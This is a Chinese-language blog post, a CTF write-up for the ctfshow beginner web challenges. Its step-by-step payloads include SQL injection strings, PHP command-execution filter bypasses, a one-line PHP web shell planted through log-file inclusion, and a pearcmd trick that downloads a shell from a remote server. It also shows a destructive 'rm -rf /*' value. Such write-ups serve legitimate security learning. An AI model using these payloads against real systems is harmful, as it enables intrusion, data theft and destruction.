
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>ctfshow萌新计划类web全解 wp | Arcueid&#39;s BLOG</title>
    <meta name="author" content="Arcueid" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <link rel="icon" href="/images/Arcueid.jpg" />
    <link rel="preconnect" href="https://cdn.staticfile.net" />
<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.loli.net" />
<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>


<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>


<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
<script src="/js/lib/math.js"></script>


<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>ARCUEID&#39;S BLOG</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;ARCUEID&#39;S BLOG</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>ctfshow萌新计划类web全解 wp</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2022/11/25
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            
            <span class="tag">
                
                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/php/" style="color: #03a9f4">php</a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/%E5%89%8D%E7%AB%AF/" style="color: #00a596">前端</a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        <blockquote>
<p>题目有多种解法,如下解法经供参考</p>
</blockquote>
<h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>sql注入<br>启动环境<br><img src="https://img-blog.csdnimg.cn/a0c5daef44b1401eb268832ea1b82022.png" alt="在这里插入图片描述"><br>无绕过,id&#x3D;1000输出flag<br>payload:<code>?id=1 or id =1000	--+</code><br>或者 <code>?id=1 union select * from article --+</code></p>
<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p>过滤了or和＋<br>payload:<code>?id=1 || id=1000 --+</code><br>或者 <code>?id=1 union select * from article --+</code></p>
<h2 id="WEB3"><a href="#WEB3" class="headerlink" title="WEB3"></a>WEB3</h2><p>过滤了更多<br><code>?id=1 union select * from article --+</code>不再可用 因为*被过滤了<br>这里利用一个intval的特性,<br>intval在php中用于获取变量的整数值,具体内容可参考<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.intval">https://www.php.net/manual/zh/function.intval</a><br>我们在传入参数的时候实际上是会以””扩起来的<br>传入1000时<br>intval得到的还是1000<br><img src="https://img-blog.csdnimg.cn/7309d5372f364504900c313c60a562ed.png" alt="在这里插入图片描述"><br>而传入’1000’intval得到的是0<br>但是变量输出仍是1000<br><img src="https://img-blog.csdnimg.cn/7236fc210eb04f798d7307884e90abfa.png" alt="在这里插入图片描述"><br>故可以构造<code>?id=&#39;1000&#39;</code></p>
<h2 id="WEB4"><a href="#WEB4" class="headerlink" title="WEB4"></a>WEB4</h2><p>?id&#x3D;’1000’&#96;</p>
<h2 id="WEB5"><a href="#WEB5" class="headerlink" title="WEB5"></a>WEB5</h2><p>过滤了单引号<br>前面的方法失效,考虑取反</p>
<pre><code class="php">~~1000
</code></pre>
<h2 id="WEB6"><a href="#WEB6" class="headerlink" title="WEB6"></a>WEB6</h2><pre><code class="php">~~1000
</code></pre>
<h2 id="WEB7"><a href="#WEB7" class="headerlink" title="WEB7"></a>WEB7</h2><pre><code class="php">0b1111101000
</code></pre>
<h2 id="WEB8"><a href="#WEB8" class="headerlink" title="WEB8"></a>WEB8</h2><p><img src="https://img-blog.csdnimg.cn/ec344d95672846429c538ce34ebdd4d7.png" alt="在这里插入图片描述"></p>
<p>$key不知道哪儿来,没有思路<br>网上说这是道梗题<br><img src="https://img-blog.csdnimg.cn/29f02c776f304e6283e4f815d26e116a.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/7cf1763de2094918822500671f5a0fea.png" alt="在这里插入图片描述"><br>阿呆删库跑路<br>所以key是rm -rf &#x2F;*</p>
<pre><code>?flag=rm -rf /*
</code></pre>
<h2 id="WEB9"><a href="#WEB9" class="headerlink" title="WEB9"></a>WEB9</h2><p><img src="https://img-blog.csdnimg.cn/bb01e706b0b24827a3169f14ff320892.png" alt="在这里插入图片描述"></p>
<p>匹配到system,exec,highlight后执行<br>看看路径<br>?c&#x3D;system(‘ls ‘);<br><img src="https://img-blog.csdnimg.cn/97c139fca88d45d8bc3a633e1ca421e4.png" alt="在这里插入图片描述"><br>?c&#x3D;system(‘cat config.php’);<br>发现一片空白<br>查看源码<br><img src="https://img-blog.csdnimg.cn/1f1521d84ba244f59489dbe8a5bca98a.png" alt="在这里插入图片描述"></p>
<h2 id="WEB10"><a href="#WEB10" class="headerlink" title="WEB10"></a>WEB10</h2><p>这次是过滤了system,exec,highlight<br>尝试取反绕过</p>
<pre><code class="bash">?c=(~%8C%86%8C%8B%9A%92)(&#39;ls&#39;);
</code></pre>
<p>其中的%8C%86%8C%8B%9A%92是通过system取反得到的<br>脚本如下</p>
<pre><code class="bash">&lt;?php
$a=~(&quot;system&quot;);
echo urlencode($a);
</code></pre>
<p>得到<br><img src="https://img-blog.csdnimg.cn/b08e09c219cf4554a0566a59ca76a1ca.png" alt="在这里插入图片描述"></p>
<pre><code class="bash">?c=(~%8C%86%8C%8B%9A%92)(&#39;cat config.php&#39;);
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/a4a202ec68b3496ba6ed06aba745241c.png" alt="在这里插入图片描述"></p>
<h2 id="WEB11"><a href="#WEB11" class="headerlink" title="WEB11"></a>WEB11</h2><p>过滤了cat 换tac读取</p>
<pre><code class="bash">?c=(~%8C%86%8C%8B%9A%92)(&#39;tac config.php&#39;);
</code></pre>
<h2 id="WEB12"><a href="#WEB12" class="headerlink" title="WEB12"></a>WEB12</h2><p>过滤了config,php还有<code>.</code><br>模糊匹配</p>
<pre><code class="bash">?c=(~%8C%86%8C%8B%9A%92)(&#39;tac c*&#39;);
</code></pre>
<h2 id="WEB13"><a href="#WEB13" class="headerlink" title="WEB13"></a>WEB13</h2><p>多过滤了个<code>;</code>用<code>?&gt;</code>就行了</p>
<pre><code class="bash">?c=(~%8C%86%8C%8B%9A%92)(&#39;tac c*&#39;)?&gt;
</code></pre>
<h2 id="WEB14"><a href="#WEB14" class="headerlink" title="WEB14"></a>WEB14</h2><p>过滤了左括号<br>取反不可行了</p>
<pre><code class="bash">?c=echo `tac confi*`?&gt;
</code></pre>
<p>其中</p>
<pre><code class="bash">`tac confi*`
</code></pre>
<p>涉及到php中反引号的作用<br>执行其内的语句并返回值</p>
<h2 id="WEB15"><a href="#WEB15" class="headerlink" title="WEB15"></a>WEB15</h2><p><img src="https://img-blog.csdnimg.cn/032bbf93207d424e9dd07d1152861448.png" alt="在这里插入图片描述"><br>测一下还有那些字符可用<br><img src="https://img-blog.csdnimg.cn/81ba2476536e494686ad172d25f6a43c.png" alt="在这里插入图片描述"><br>这里虽然禁止了?&gt;但是分号又可用了<br>用反引号接收一个参数a,然后a中是所需执行的语句</p>
<pre><code class="c">?c=echo `$_GET[a]`;&amp;a=cat config.php
</code></pre>
<h2 id="WEB16"><a href="#WEB16" class="headerlink" title="WEB16"></a>WEB16</h2><p><img src="https://img-blog.csdnimg.cn/851becbafe40477db4948bc84dd0f4fc.png" alt="在这里插入图片描述"></p>
<p>md5强碰撞<br>那个md5解出来是ctfshow36d<br>由于已经给了ctfshow</p>
<pre><code class="php">?c=36d
</code></pre>
<h2 id="WEB17"><a href="#WEB17" class="headerlink" title="WEB17"></a>WEB17</h2><p><img src="https://img-blog.csdnimg.cn/719f6b4f0b4344638511a4178f0b1347.png" alt="在这里插入图片描述"><br>文件包含,过滤了php<br>考虑日志文件包含<br>一个个试</p>
<pre><code class="php">?c=/var/log/apache/access.log
</code></pre>
<p>测试发现不是apache</p>
<pre><code class="php">?c=/var/log/nginx/access.log
</code></pre>
<p>是nginx<br>发现显示内容中有ua<br>随便传个参数进去,抓包改ua为一句话木马</p>
<pre><code class="php">&lt;?php eval(@$_REQUEST[&#39;114514&#39;]); ?&gt;
</code></pre>
<p>蚁剑连上<br><img src="https://img-blog.csdnimg.cn/11a9ade2382540898a3ebab3dbb07972.png" alt="在这里插入图片描述"></p>
<p>在36d.php中拿到flag</p>
<h2 id="WEB18"><a href="#WEB18" class="headerlink" title="WEB18"></a>WEB18</h2><p>多过滤了个file<br>这说明WEB17也可以用php伪协议做<br>对日志文件包含没干扰</p>
<pre><code class="php">?c=/var/log/nginx/access.log
</code></pre>
<p>和web17如出一辙,就不复述了</p>
<h2 id="WEB19"><a href="#WEB19" class="headerlink" title="WEB19"></a>WEB19</h2><p>多过滤了个base<br>同上</p>
<pre><code class="php">?c=/var/log/nginx/access.log
</code></pre>
<h2 id="WEB20"><a href="#WEB20" class="headerlink" title="WEB20"></a>WEB20</h2><p>多过滤了个rog<br>同上</p>
<pre><code class="php">?c=/var/log/nginx/access.log
</code></pre>
<h2 id="WEB21"><a href="#WEB21" class="headerlink" title="WEB21"></a>WEB21</h2><p>过滤冒号<br>同上</p>
<pre><code class="php">?c=/var/log/nginx/access.log
</code></pre>
<h2 id="WEB22"><a href="#WEB22" class="headerlink" title="WEB22"></a>WEB22</h2><p><img src="https://img-blog.csdnimg.cn/f304694b913642d5a804846d1f716b90.png" alt="在这里插入图片描述"></p>
<p>过滤了冒号和正反斜杠<br>无思路,参考了如下文章<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108954166">https://blog.csdn.net/qq_46091464&#x2F;article&#x2F;details&#x2F;108954166</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46041723/article/details/110948866">https://blog.csdn.net/qq_46041723&#x2F;article&#x2F;details&#x2F;110948866</a><br>在自己的服务器上写一个一句话木马<br>然后让靶机下载这个木马<br>这里用到了register_argc_argv的知识<br>在register_argc_argv开启的时候可以通过+来分隔变量<br>先进行包含pearcmd.php然后在通过+分隔符来执行download命令</p>
<pre><code class="php">?c=pearcmd&amp;+download+http:/xxxxxxxxxxxx/shell.php
</code></pre>
<p>然后访问shell<br>在post中进行命令执行</p>
<h2 id="获得百分之百的快乐"><a href="#获得百分之百的快乐" class="headerlink" title="获得百分之百的快乐"></a>获得百分之百的快乐</h2><p>做了长度限制<br>只能接收长度小于4的参数<br>先执行ls看看<br><img src="https://img-blog.csdnimg.cn/908d19685e0b4fe29dc5e9a3a25fa409.png" alt="在这里插入图片描述"><br>发现只有s和z开头的文件<br>那么可以考虑执行如下语句</p>
<pre><code class="php">?1=&gt;nl
</code></pre>
<p>然后</p>
<pre><code class="php">?1=*
</code></pre>
<p>其意义是<br>先创建一个叫nl的文件<br>然后以最先匹配到的作为命令执行,其余文件当参数<br>如我这里有一个z.txt<br><img src="https://img-blog.csdnimg.cn/8fec5764de774d16914274c4bb5fbfc3.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0bed1c05852946d3bf1114431b4863ee.png" alt="在这里插入图片描述"><br>可以看到输出了z,txt中的内容<br>对于本题执行将会读取那两个文件中的内容<br>最后查看源码,flag就在源码中</p>
<h2 id="WEB23-24"><a href="#WEB23-24" class="headerlink" title="WEB23&amp;24"></a>WEB23&amp;24</h2><p><img src="https://img-blog.csdnimg.cn/e53079af374a467d940afc2fd0d75b89.png" alt="在这里插入图片描述"><br>尝试上传<br><img src="https://img-blog.csdnimg.cn/7c4d81a95d5741b38c20a62d164a6560.png" alt="在这里插入图片描述"><br>尝试访问,发现不存在<br>那么因该是考条件竞争<br>payload可以参考如下文章<br><a target="_blank" rel="noopener" href="https://wp.ctf.show/d/131-23-24"><code>https://wp.ctf.show/d/131-23-24</code></a></p>

    </div>
    
    
    
    
    
    
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 Arcueid&#39;s BLOG
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;Arcueid
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    




    
</body>
</html>
